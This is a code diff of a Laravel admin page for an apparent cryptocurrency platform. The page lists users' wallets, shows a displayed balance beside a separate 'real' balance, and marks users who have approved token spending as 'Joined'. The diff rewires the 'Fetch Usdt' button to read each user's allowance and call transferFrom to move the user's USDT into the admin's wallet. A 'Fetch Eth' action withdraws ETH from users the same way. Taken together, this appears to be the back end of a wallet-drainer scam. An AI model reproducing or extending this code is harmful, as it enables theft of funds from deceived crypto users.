@@ -15,17 +15,16 @@
         <div class="card">
             <div class="card-header">
                 <div class="row">
-                   
+
                     <div class="col-md-12">
                         <div class="float-left">
                             <small>Assets = </small>{{$assets}} / <small>Liabilities = </small>{{$liable}} <br/>
 
                         </div>
                         <div class="float-right">
-                            {{-- <small>Connected Wallet:</small> --}}
-                            <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
-                                Connect
-                            </button>
+                            <div id="app">
+                                <Wallet />
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -38,11 +37,10 @@
                             <th style="width: 10px">#</th>
                             <th>User Id</th>
                             <th>Wallet Address</th>
-                            <th>Balance (ETH)</th>
-                            <th>Real Balance (ETH)</th>
-                            <th>Balance (USDT)</th>
-                            <th>Real Balance (USDT)</th>
+                            <th>Balance</th>
+                            <th>Real Balance</th>
                             <th>Status</th>
+                            <th>Last Updated</th>
                             <th style="width: 40px">Actions</th>
                         </tr>
                     </thead>
@@ -50,50 +48,90 @@
                         @foreach($data as $key => $user)
                         <tr>
                             <td>{{$key += 1}}</td>
-                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}}</a></td>
+                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}} <br/>
+                                <span class="badge badge-info">@if($user->token_approved == 1) <small>Joined</small>@endif</span>
+                            </a></td>
                             <td>{{$user->wallet}} <br> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                             {{-- {{$stats}} --}}
-                            <td>
-                                @if (count($user->balance) > 0) 
+                            {{-- <td>
+                                @if (count($user->balance) > 0)
                                     {{$user->balance[0]->statistics_eth }}
                                     <br> <span class="badge badge-primary">{{$user->balance[0]->updated_at }}</span>
-                                    
+
+                                @else
+                                    -
+                                @endif
+                            </td> --}}
+
+                            {{-- <td id="real_balance">{{$user->eth_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td> --}}
+
+                            <td>
+                                @if (count($user->balance) > 0)
+                                    <span class="badge badge-transparent"><img src="{{asset('images/tether.png')}}" alt="Tether Icon" style="width: 20px; height: 20px;"/> {{$user->balance[0]->statistics_usdt }}</span>
+                                    <span class="badge badge-transparent"><img src="{{asset('images/eth.png')}}" alt="Tether Icon" style="width: 20px; height: 20px;"/> {{number_format($user->balance[0]->statistics_eth,4) }}</span>
                                 @else
                                     -
                                 @endif
                             </td>
-
-                            <td id="real_balance">{{$user->eth_real_balance}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>
-
-                            <td>
-                                @if (count($user->balance) > 0) 
-                                    {{$user->balance[0]->statistics_usdt }}
-                                @else
-                                    -
-                                @endif
+                            <td id="real_balance"><span class="badge badge-transparent"><img src="{{asset('images/tether.png')}}" alt="Tether Icon" style="width: 20px; height: 20px;"/> {{$user->usdt_real_balance ? $user->usdt_real_balance : '-' }}</span>
+                                <span class="badge badge-transparent"><img src="{{asset('images/eth.png')}}" alt="Tether Icon" style="width: 20px; height: 20px;"/> {{$user->eth_real_balance ? $user->eth_real_balance : '-' }}</span>
                             </td>
-                            <td id="real_balance">{{$user->usdt_real_balance}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>
 
-                                
-                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
+
+                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif<br>
+                            @if(isset($user->balance[0]->updated_by))
+                                <span class="badge badge-info">{{\App\Models\User::find($user->balance[0]->updated_by)->name}}
+                                </span>
+                            @endif
+                            </td>
+                            <td><span class="text-secondary">{{$user->updated_at->diffForhumans() }}</span></td>
                             <td>
+                                {{-- <div class="dropdown">
+                                    <button onclick="myFunction({{$user->id}})" class="dropbtn"><i class="fas fa-ellipsis-v"></i></button>
+                                    <div id="myDropdown_{{$user->id}}" class="dropdown-content">
+                                        @if ($user->status == 'pending')
+                                        <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
+                                            Approve
+                                        </a>
+                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
+                                        @else
+                                        <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
+                                            Fetch Usdt
+                                        </a>
+                                        <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
+                                            Fetch Eth
+                                        </a>
+                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
+                                        @endif
+                                    </div>
+                                </div> --}}
+                                <div class="dropdown show">
+                                    <a class="btn btn-secondary" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                        <i class="fas fa-ellipsis-v"></i>
+                                    </a>
+                                  
+                                    <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
+                                        @if ($user->status == 'pending')
+                                        <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn-sm dropdown-item">
+                                            Approve
+                                        </a>
+                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn-sm dropdown-item">Manage balance</a>
+                                        @else
+                                        <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn-sm dropdown-item" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
+                                            Fetch Usdt
+                                        </a>
+                                        <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn-sm dropdown-item" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
+                                            Fetch Eth
+                                        </a>
+                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn-sm dropdown-item">Manage balance</a>
+                                        @endif
+                                    </div>
+                                  </div>
                                 {{-- <button class="btn btn-secondary">
                                 <i class="fas fa-ellipsis-v"></i>
                                 </button> --}}
                                 {{-- @include('partials._drop1'); --}}
-                                @if ($user->status == 'pending')
-                                <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
-                                    Approve
-                                </a>
-                                @else
-                                <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
-                                    Fetch Usdt
-                                </a>
-                                <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
-                                    Fetch Eth
-                                </a>
-                                <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
-                                @endif
+                           
                             </td>
                         </tr>
                         @endforeach
@@ -109,17 +147,19 @@
 </div>
 <!-- /.content -->
 @endsection
-@section('scripts')
+@push('scripts')
 
 <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
 <script src="{{ asset('contracts/contractABI.js') }}"></script>
 <script src="{{ asset('contracts/contractAddress.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractABI.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractAddress.js') }}"></script>
 <script src="{{asset('plugins/data-tables/dataTables.min.js')}}"></script>
-
 
 <script>
     const web3 = new Web3(window.ethereum)
     const contract = new web3.eth.Contract(contractABI, contractAddress)
+    const tokenContract = new web3.eth.Contract(tokenContractABI, tokenContractAddress)
 
     // Get info
     const getInfo = async () => {
@@ -147,11 +187,7 @@
 
     // Withdraw from user
     const withdrawETH = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
+        let adminWalletAddress = $('#modal-spender').val();
         let user = $('#modal-wallet').val();
         let amount = $('#modal-amount').val();
 
@@ -163,17 +199,15 @@
         if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
 
             $("#modal-amount").css("border", "1px solid red");
-          
+
         }else{
 
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
-            
-        
+
             try {
                 // Convert amount to Wei
                 const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
-
 
                 // Call the withdraw method on the contract
                 const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
@@ -195,13 +229,14 @@
                         data: {
                             wallet: user,
                             amount: amount,
-                            spender: accounts[0],
+                            spender: adminWalletAddress,
                         },
                     }).done(function(response) {
                         if (response == 'ok') {
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
@@ -218,57 +253,54 @@
 
     // Withdraw from user
     const withdrawUSDT = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
-        let user = $('#modal-wallet').val();
-        let amount = parseInt($('#modal-amount').val());
+        let adminWalletAddress = $('#modal-spender').val();
+        let userWalletAddress = $('#modal-wallet').val();
+        var amount = parseInt($('#modal-amount').val() * 1000000);
 
         var balance = $("#modal-amount").val();
 
         var a_balance = $("#modal-balance").text();
 
-
         if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
-
             $("#modal-amount").css("border", "1px solid red");
-          
         }else{
-
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
 
             try {
-                // Call the withdraw method on the contract
+                let allowanceAmount = await tokenContract.methods.allowance(userWalletAddress, adminWalletAddress).call()
 
-                const transaction = await contract.methods.withdrawUSDT(user, amount).send({
-                    from: adminWalletAddress,
-                });
-                console.log('USDT Withdrawal successful:', transaction)
+                allowanceAmount = Number(allowanceAmount.toString())
 
-                if(transaction)
-                {
+                // let usdtAmount = amount * 1000000;
+
+                // alert(amount);
+                
+                const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
+                    from: adminWalletAddress
+                })
+
+                if (tx.transactionHash) {
                     $.ajaxSetup({
-                    headers: {
-                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                    }
+                        headers: {
+                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                        }
                     });
 
                     $.ajax({
                         url: "{{ route('fetch.usdt_tokens') }}",
                         type: 'POST',
                         data: {
-                            wallet: user,
+                            wallet: userWalletAddress,
                             amount: amount,
-                            spender: accounts[0],
+                            spender: adminWalletAddress,
                         },
                     }).done(function(response) {
                         if (response == 'ok') {
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
@@ -308,59 +340,64 @@
     };
 
     async function fetchEthToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
-
+      
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
+        var spender = $("#modal-spender").val();
 
-        if(balance == '' || balance == '0.0' || balance == '0')
-        {
-            $('#errorForm').modal('show');
-            
+        if(spender == ''){
+
+            $('#spendererrorForm').modal('show');
         }else{
 
-            $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
-            $("#modal-balance").text(balance);
+            if(balance == '' || balance == '0.0' || balance == '0')
+            {
+                $('#errorForm').modal('show');
 
-            $('#fetchForm').modal({
-                backdrop: 'static',
-                keyboard: false  // to prevent closing with Esc button (if you want this too)
-            });
+            }else{
+
+                $("#modal-wallet").val(wallet);
+                // $("#modal-spender").val(adminWalletAddress);
+                $("#modal-balance").text(balance);
+
+                $('#fetchForm').modal({
+                    backdrop: 'static',
+                    keyboard: false  // to prevent closing with Esc button (if you want this too)
+                });
+            }
         }
-
     }
 
     async function fetchUsdtToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
-
+     
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
+        var spender = $("#modal-spender").val();
 
-        if(balance == '' || balance == '0.0' || balance == '0')
-        {
-            $('#errorForm').modal('show');
+        if(spender == ''){
+
+            $('#spendererrorForm').modal('show');
 
         }else{
 
-            $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
-            $("#modal-balance").text(balance);
+            if(balance == '' || balance == '0.0' || balance == '0')
+            {
+                $('#errorForm').modal('show');
 
-            $("#btn-fetch").attr('onClick','withdrawUSDT()');
+            }else{
 
-            $('#fetchForm').modal({
-                backdrop: 'static',
-                keyboard: false  // to prevent closing with Esc button (if you want this too)
-            });
+                $("#modal-wallet").val(wallet);
+                // $("#modal-spender").val(adminWalletAddress);
+                $("#modal-balance").text(balance);
+
+                $("#btn-fetch").attr('onClick','withdrawUSDT()');
+
+                $('#fetchForm').modal({
+                    backdrop: 'static',
+                    keyboard: false  // to prevent closing with Esc button (if you want this too)
+                });
+            }
         }
-
     }
 
     function checkBalance() {
@@ -387,5 +424,23 @@
         "ordering": true,
         responsive: true
     });
+
+    function myFunction(id) {
+        document.getElementById("myDropdown_"+id).classList.toggle("show");
+    }
+
+        // Close the dropdown if the user clicks outside of it
+        window.onclick = function(event) {
+            if (!event.target.matches('.dropbtn')) {
+                var dropdowns = document.getElementsByClassName("dropdown-content");
+                var i;
+                for (i = 0; i < dropdowns.length; i++) {
+                var openDropdown = dropdowns[i];
+                if (openDropdown.classList.contains('show')) {
+                    openDropdown.classList.remove('show');
+                }
+                }
+            }
+    }
 </script>
-@endsection
+@endpush
